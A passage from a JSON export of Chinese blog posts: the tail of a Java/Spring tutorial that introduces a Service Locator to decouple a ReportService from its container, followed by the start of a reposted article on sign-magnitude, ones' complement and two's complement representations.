margin-right:0px!important; margin-bottom:0px!important\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;generator.generate(table);&nbsp;</span></li><li class=\"alt\" style=\"padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important; margin-left:20px; color:inherit; line-height:1.3em; list-style:decimal-leading-zero outside; border:none\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;</span></li><li style=\"margin-left:20px; line-height:1.3em; list-style:decimal-leading-zero outside; border:none; padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">}&nbsp;</span></li><li class=\"alt\" style=\"padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important; margin-left:20px; color:inherit; line-height:1.3em; list-style:decimal-leading-zero outside; border:none\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;</span></li><li style=\"margin-left:20px; line-height:1.3em; list-style:decimal-leading-zero outside; border:none; padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\"><span class=\"keyword\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,102,153); font-weight:bold; background-color:inherit\">public</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;</span><span class=\"keyword\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,102,153); font-weight:bold; background-color:inherit\">class</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;Client&nbsp;{&nbsp;</span></span></li><li class=\"alt\" style=\"padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important; margin-left:20px; color:inherit; line-height:1.3em; list-style:decimal-leading-zero outside; border:none\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"keyword\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,102,153); font-weight:bold; background-color:inherit\">public</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;</span><span class=\"keyword\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,102,153); font-weight:bold; background-color:inherit\">static</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;</span><span class=\"keyword\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,102,153); font-weight:bold; background-color:inherit\">void</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;main(String[]&nbsp;args)&nbsp;{&nbsp;</span></span></li><li style=\"margin-left:20px; line-height:1.3em; list-style:decimal-leading-zero outside; border:none; padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Container&nbsp;container&nbsp;=&nbsp;<span class=\"keyword\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,102,153); font-weight:bold; background-color:inherit\">new</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;Container();&nbsp;</span></span></li><li class=\"alt\" style=\"padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important; margin-left:20px; color:inherit; line-height:1.3em; list-style:decimal-leading-zero outside; border:none\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ReportService&nbsp;reportService&nbsp;=&nbsp;(ReportService)<span style=\"padding:0px; margin:0px; border:none; background-color:rgb(255,255,0)\">Container.getBean</span>(<span class=\"string\" style=\"padding:0px; margin:0px; border:none; color:blue; background-color:inherit\">&quot;reportService&quot;</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">);&nbsp;</span></span></li><li style=\"margin-left:20px; line-height:1.3em; list-style:decimal-leading-zero outside; border:none; padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;reportService.getDailyReport(<span class=\"keyword\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,102,153); font-weight:bold; background-color:inherit\">new</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;Date());&nbsp;</span></span></li><li class=\"alt\" style=\"padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important; margin-left:20px; color:inherit; line-height:1.3em; list-style:decimal-leading-zero outside; border:none\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"comment\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,130,0); background-color:inherit\">//reportService.getMonthlyReport(new&nbsp;Date());</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;</span></span></li><li style=\"margin-left:20px; line-height:1.3em; list-style:decimal-leading-zero outside; border:none; padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;</span></li><li class=\"alt\" style=\"padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important; margin-left:20px; color:inherit; line-height:1.3em; list-style:decimal-leading-zero outside; border:none\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">}&nbsp;</span></li></ol></pre>\r\n<div align=\"left\" style=\"padding:0px; margin:0px; color:rgb(85,85,85); font-family:宋体,'Arial Narrow',arial,serif; font-size:14px; line-height:28px\">\r\n&nbsp;</div>\r\n<div align=\"left\" style=\"padding:0px; margin:0px; color:rgb(85,85,85); font-family:宋体,'Arial Narrow',arial,serif; font-size:14px; line-height:28px\">\r\n<span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">时序图大致如下：</span></div>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden; color:rgb(85,85,85); font-family:宋体,'Arial Narrow',arial,serif; font-size:14px; line-height:28px\">\r\n<span style=\"padding:0px; margin:0px; font-size:12pt\"></span></p>\r\n<p style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden; color:rgb(85,85,85); font-family:宋体,'Arial Narrow',arial,serif; font-size:14px; line-height:28px\">\r\n<a target=\"_blank\" target=\"_blank\" href=\"http://img1.51cto.com/attachment/201012/212226192.jpg\" style=\"padding:0px; margin:0px; color:rgb(92,101,13); text-decoration:none\"><img border=\"0\" alt=\"\" src=\"http://img1.51cto.com/attachment/201012/212226192.jpg\" style=\"padding:0px; margin:0px; vertical-align:top; border:none\"></a></p>\r\n<div align=\"left\" style=\"padding:0px; margin:0px; color:rgb(85,85,85); font-family:宋体,'Arial Narrow',arial,serif; font-size:14px; line-height:28px\">\r\n&nbsp;</div>\r\n<div align=\"left\" style=\"padding:0px; margin:0px; color:rgb(85,85,85); font-family:宋体,'Arial Narrow',arial,serif; font-size:14px; line-height:28px\">\r\n<span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">效果：</span></span></div>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden; color:rgb(85,85,85); font-family:宋体,'Arial Narrow',arial,serif; font-size:14px; line-height:28px\">\r\n<span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">如上面所示，</span><span style=\"padding:0px; margin:0px; font-size:12pt\">ReportService&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">不再与具体的</span><span style=\"padding:0px; margin:0px; font-size:12pt\">&nbsp;ReportGenerator&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">直接关联，已经用容器将接口和实现隔离开来了，提高了系统组件</span><span style=\"padding:0px; margin:0px; font-size:12pt\">&nbsp;Bean&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">的重用性，此时还可以使用配置文件在</span><span style=\"padding:0px; margin:0px; font-size:12pt\">&nbsp;Container&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">中实时获取具体组件的定义。</span></p>\r\n<div align=\"left\" style=\"padding:0px; margin:0px; color:rgb(85,85,85); font-family:宋体,'Arial Narrow',arial,serif; font-size:14px; line-height:28px\">\r\n&nbsp;</div>\r\n<div align=\"left\" style=\"padding:0px; margin:0px; color:rgb(85,85,85); font-family:宋体,'Arial Narrow',arial,serif; font-size:14px; line-height:28px\">\r\n&nbsp;</div>\r\n<div align=\"left\" style=\"padding:0px; margin:0px; color:rgb(85,85,85); font-family:宋体,'Arial Narrow',arial,serif; font-size:14px; line-height:28px\">\r\n<span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">问题描述：</span></span></div>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden; color:rgb(85,85,85); font-family:宋体,'Arial Narrow',arial,serif; font-size:14px; line-height:28px\">\r\n<span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">然而，观察上面的类图，很容易发现</span><span style=\"padding:0px; margin:0px; font-size:12pt\">&nbsp;ReportService&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">与</span><span style=\"padding:0px; margin:0px; font-size:12pt\">&nbsp;Container&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">之间存在双向关联，彼此互相有依赖关系。并且，如果想要重用</span><span style=\"padding:0px; margin:0px; font-size:12pt\">&nbsp;ReportService</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">，由于它也是直接依赖于单独一个</span><span style=\"padding:0px; margin:0px; font-size:12pt\">&nbsp;Container&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">的<span style=\"padding:0px; margin:0px; background:yellow\">具体查找逻辑</span>。若其他容器具体不同的组件查找机制（如</span><span style=\"padding:0px; margin:0px; font-size:12pt\">&nbsp;JNDI</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">），此时重用</span><span style=\"padding:0px; margin:0px; font-size:12pt\">&nbsp;ReportService&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">意味着需要修改</span><span style=\"padding:0px; margin:0px; font-size:12pt\">&nbsp;Container&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">的内部查找逻辑。</span></p>\r\n<div align=\"left\" style=\"padding:0px; margin:0px; color:rgb(85,85,85); font-family:宋体,'Arial Narrow',arial,serif; font-size:14px; line-height:28px\">\r\n&nbsp;</div>\r\n<div align=\"left\" style=\"padding:0px; margin:0px; color:rgb(85,85,85); font-family:宋体,'Arial Narrow',arial,serif; font-size:14px; line-height:28px\">\r\n<span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">解决方案：</span></span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">引入</span><span style=\"padding:0px; margin:0px; font-size:12pt\">&nbsp;Service\r\n Locator</span></div>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden; color:rgb(85,85,85); font-family:宋体,'Arial Narrow',arial,serif; font-size:14px; line-height:28px\">\r\n<span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">再次引入一个间接层</span><span style=\"padding:0px; margin:0px; font-size:12pt\">&nbsp;Service Locator</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">，用于提供组件查找逻辑的接口，请看</span><span style=\"padding:0px; margin:0px; font-size:12pt\"><a target=\"_blank\" href=\"http://en.wikipedia.org/wiki/Service_locator_pattern\" style=\"padding:0px; margin:0px; color:rgb(92,101,13); text-decoration:none\">Wikipedia&nbsp;<span style=\"padding:0px; margin:0px; font-family:宋体\">中的描述</span></a>&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">或者</span><span style=\"padding:0px; margin:0px; font-size:12pt\">&nbsp;Java\r\n EE&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">对其的</span><span style=\"padding:0px; margin:0px; font-size:12pt\"><a target=\"_blank\" href=\"http://java.sun.com/blueprints/patterns/ServiceLocator.html\" style=\"padding:0px; margin:0px; color:rgb(92,101,13); text-decoration:none\"><span style=\"padding:0px; margin:0px; font-family:宋体\">描述</span>1</a>&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">、</span><span style=\"padding:0px; margin:0px; font-size:12pt\"><a target=\"_blank\" href=\"http://java.sun.com/blueprints/corej2eepatterns/Patterns/ServiceLocator.html\" style=\"padding:0px; margin:0px; color:rgb(92,101,13); text-decoration:none\"><span style=\"padding:0px; margin:0px; font-family:宋体\">描述</span>2</a>&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">。这样就能够将可能变化的点隔离开来。</span></p>\r\n<div align=\"left\" style=\"padding:0px; margin:0px; color:rgb(85,85,85); font-family:宋体,'Arial Narrow',arial,serif; font-size:14px; line-height:28px\">\r\n&nbsp;</div>\r\n<div align=\"left\" style=\"padding:0px; margin:0px; color:rgb(85,85,85); font-family:宋体,'Arial Narrow',arial,serif; font-size:14px; line-height:28px\">\r\n<span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">实现方法：</span></div>\r\n<div align=\"left\" style=\"padding:0px; margin:0px; color:rgb(85,85,85); font-family:宋体,'Arial Narrow',arial,serif; font-size:14px; line-height:28px\">\r\n<span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">类图如下：</span></div>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden; color:rgb(85,85,85); font-family:宋体,'Arial Narrow',arial,serif; font-size:14px; line-height:28px\">\r\n<span style=\"padding:0px; margin:0px; font-size:12pt\"></span></p>\r\n<p style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden; color:rgb(85,85,85); font-family:宋体,'Arial Narrow',arial,serif; font-size:14px; line-height:28px\">\r\n<a target=\"_blank\" target=\"_blank\" href=\"http://img1.51cto.com/attachment/201012/212318598.jpg\" style=\"padding:0px; margin:0px; color:rgb(92,101,13); text-decoration:none\"><img border=\"0\" alt=\"\" src=\"http://img1.51cto.com/attachment/201012/212318598.jpg\" style=\"padding:0px; margin:0px; vertical-align:top; border:none\"></a></p>\r\n<div align=\"left\" style=\"padding:0px; margin:0px; color:rgb(85,85,85); font-family:宋体,'Arial Narrow',arial,serif; font-size:14px; line-height:28px\">\r\n&nbsp;</div>\r\n<div align=\"left\" style=\"padding:0px; margin:0px; color:rgb(85,85,85); font-family:宋体,'Arial Narrow',arial,serif; font-size:14px; line-height:28px\">\r\n<span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">代码实现：</span></div>\r\n<div align=\"left\" style=\"padding:0px; margin:0px; color:rgb(85,85,85); font-family:宋体,'Arial Narrow',arial,serif; font-size:14px; line-height:28px\">\r\n&nbsp;</div>\r\n<pre style=\"padding:0px; margin-top:0px; margin-bottom:1em; font-family:'Courier New',monospace; overflow:auto; width:710.813px; color:rgb(85,85,85); background:rgb(247,247,247)\"><ol class=\"dp-j\" style=\"padding:5px 0px; margin:0px; color:rgb(92,92,92); border-left-width:3px; border-style:none none none solid; border-left-color:rgb(20,107,0)\"><li class=\"alt\" style=\"padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important; margin-left:20px; color:inherit; line-height:1.3em; list-style:decimal-leading-zero outside; border:none\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\"><span class=\"comment\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,130,0); background-color:inherit\">//&nbsp;实际应用中可以是用&nbsp;interface&nbsp;来提供统一接口</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;</span></span></li><li style=\"margin-left:20px; line-height:1.3em; list-style:decimal-leading-zero outside; border:none; padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\"><span class=\"keyword\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,102,153); font-weight:bold; background-color:inherit\">class</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;ServiceLocator&nbsp;{&nbsp;</span></span></li><li class=\"alt\" style=\"padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important; margin-left:20px; color:inherit; line-height:1.3em; list-style:decimal-leading-zero outside; border:none\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"keyword\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,102,153); font-weight:bold; background-color:inherit\">private</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;</span><span class=\"keyword\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,102,153); font-weight:bold; background-color:inherit\">static</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;Container&nbsp;container&nbsp;=&nbsp;</span><span class=\"keyword\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,102,153); font-weight:bold; background-color:inherit\">new</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;Container();&nbsp;</span></span></li><li style=\"margin-left:20px; line-height:1.3em; list-style:decimal-leading-zero outside; border:none; padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li class=\"alt\" style=\"padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important; margin-left:20px; color:inherit; line-height:1.3em; list-style:decimal-leading-zero outside; border:none\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"keyword\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,102,153); font-weight:bold; background-color:inherit\">public</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;</span><span class=\"keyword\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,102,153); font-weight:bold; background-color:inherit\">static</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;ReportGenerator&nbsp;getReportGenerator()&nbsp;{&nbsp;</span></span></li><li style=\"margin-left:20px; line-height:1.3em; list-style:decimal-leading-zero outside; border:none; padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"keyword\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,102,153); font-weight:bold; background-color:inherit\">return</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;(ReportGenerator)</span><span style=\"padding:0px; margin:0px; border:none; background-color:rgb(255,255,0)\">container.getBean(<span class=\"string\" style=\"padding:0px; margin:0px; border:none; color:blue; background-color:inherit\">&quot;reportGeneraator&quot;</span>);</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;</span></span></li><li class=\"alt\" style=\"padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important; margin-left:20px; color:inherit; line-height:1.3em; list-style:decimal-leading-zero outside; border:none\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;</span></li><li style=\"margin-left:20px; line-height:1.3em; list-style:decimal-leading-zero outside; border:none; padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">}&nbsp;</span></li><li class=\"alt\" style=\"padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important; margin-left:20px; color:inherit; line-height:1.3em; list-style:decimal-leading-zero outside; border:none\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;</span></li><li style=\"margin-left:20px; line-height:1.3em; list-style:decimal-leading-zero outside; border:none; padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\"><span class=\"keyword\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,102,153); font-weight:bold; background-color:inherit\">class</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;ReportService&nbsp;{&nbsp;</span></span></li><li class=\"alt\" style=\"padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important; margin-left:20px; color:inherit; line-height:1.3em; list-style:decimal-leading-zero outside; border:none\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"keyword\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,102,153); font-weight:bold; background-color:inherit\">private</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;ReportGenerator&nbsp;reportGenerator&nbsp;=&nbsp;<span style=\"padding:0px; margin:0px; border:none; background-color:rgb(255,255,0)\">ServiceLocator</span>.getReportGenerator();&nbsp;</span></span></li><li style=\"margin-left:20px; line-height:1.3em; list-style:decimal-leading-zero outside; border:none; padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li class=\"alt\" style=\"padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important; margin-left:20px; color:inherit; line-height:1.3em; list-style:decimal-leading-zero outside; border:none\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"comment\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,130,0); background-color:inherit\">//&nbsp;...</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;</span></span></li><li style=\"margin-left:20px; line-height:1.3em; list-style:decimal-leading-zero outside; border:none; padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">}&nbsp;</span></li></ol></pre>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden; color:rgb(85,85,85); font-family:宋体,'Arial Narrow',arial,serif; font-size:14px; line-height:28px\">\r\n<span style=\"font-family:'Courier New'; font-size:12px; color:#3F7F5F; padding:0px; margin:0px\"><br style=\"padding:0px; margin:0px\">\r\n</span>&nbsp;</p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden; color:rgb(85,85,85); font-family:宋体,'Arial Narrow',arial,serif; font-size:14px; line-height:28px\">\r\n<span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">小结：</span></span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; margin-left:18pt; clear:both; height:auto; overflow:hidden; color:rgb(85,85,85); font-family:宋体,'Arial Narrow',arial,serif; font-size:14px; line-height:28px; text-indent:-18pt\">\r\n<span style=\"padding:0px; margin:0px; font-size:12pt\">1、</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">虽然讲了这么大篇幅还没有进入真正的主题——</span><span style=\"padding:0px; margin:0px; font-size:12pt\">IoC</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">、</span><span style=\"padding:0px; margin:0px; font-size:12pt\">DI</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">，不过已经在一步步&#36924;近了，<span style=\"padding:0px; margin:0px; background:yellow\">下一篇应该会更精彩！<a target=\"_blank\" target=\"_blank\" href=\"http://haolloyin.blog.51cto.com/1177454/460631\" style=\"padding:0px; margin:0px; color:rgb(92,101,13); text-decoration:none\"><span style=\"padding:0px; margin:0px; color:rgb(0,0,255)\"><span style=\"padding:0px; margin:0px\">在这里...</span></span></a></span></span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; margin-left:18pt; clear:both; height:auto; overflow:hidden; color:rgb(85,85,85); font-family:宋体,'Arial Narrow',arial,serif; font-size:14px; line-height:28px; text-indent:-18pt\">\r\n<span style=\"padding:0px; margin:0px; font-size:12pt\">2、</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">可以很明显地看得出上面两中重新设计以解耦、隔离变化点都是通过引入间接层得以解决的。</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; margin-left:18pt; clear:both; height:auto; overflow:hidden; color:rgb(85,85,85); font-family:宋体,'Arial Narrow',arial,serif; font-size:14px; line-height:28px; text-indent:-18pt\">\r\n<span style=\"padding:0px; margin:0px; font-size:12pt\">3、</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">在看书过程中，我感觉《</span><span style=\"padding:0px; margin:0px; font-size:12pt\">Spring&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">攻略》一书中以“问题描述、解决方案、实现方法”方式的讲解比较容易理解和理清思路，故而也学习用这种方式来写。另，推荐该书以学习</span><span style=\"padding:0px; margin:0px; font-size:12pt\">&nbsp;Spring&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">框架（尽管目前我看得也不多）。</span></p>\r\n<br>\r\n",
			"tags":"java,spring",
			"id":"49616999",
			"categories":"JAVA_spring",
			"status":1
		},
		"error":"",
		"status":true
	},
	{
		"data":{
			"date":"2015年10月29日 19:26:20",
			"articleedittype":1,
			"private":0,
			"channel":"16",
			"description":"本篇文章讲解了计算机的原码, 反码和补码. 并且进行了深入探求了为何要使用反码和补码, 以及更进一步的论证了为何可以用反码, 补码的加法计算原码的减法. 论证部分如有不对的地方请各位牛人帮忙指正! 希望本文对大家学习计算机基础有所帮助!",
			"title":"原码, 反码, 补码 详解",
			"type":"repost",
			"content":"\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n<span style=\"color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px; background-color:rgb(255,254,238)\">作者：</span><a target=\"_blank\" href=\"http://www.cnblogs.com/zhangziqiu/\" style=\"margin:0px; padding:0px; text-decoration:none; color:rgb(0,0,0); border-bottom-width:1px; border-bottom-style:dotted; border-bottom-color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">张子秋</a><br style=\"margin:0px; padding:0px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n<span style=\"color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px; background-color:rgb(255,254,238)\">出处：</span><a target=\"_blank\" href=\"http://www.cnblogs.com/zhangziqiu/\" style=\"margin:0px; padding:0px; text-decoration:none; color:rgb(0,0,0); border-bottom-width:1px; border-bottom-style:dotted; border-bottom-color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">http://www.cnblogs.com/zhangziqiu/</a><span style=\"color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px; background-color:rgb(255,254,238)\">&nbsp;</span><br style=\"margin:0px; padding:0px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n<span style=\"color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px; background-color:rgb(255,254,238)\">本文版权归作者和博客园共有，欢迎转载，但未经作者同意必须保留此段声明，且在文章页面明显位置给出原文连接，否则保留追究法律责任的权利。</span><br>\r\n</p>\r\n<p style=\"margin:10px auto; 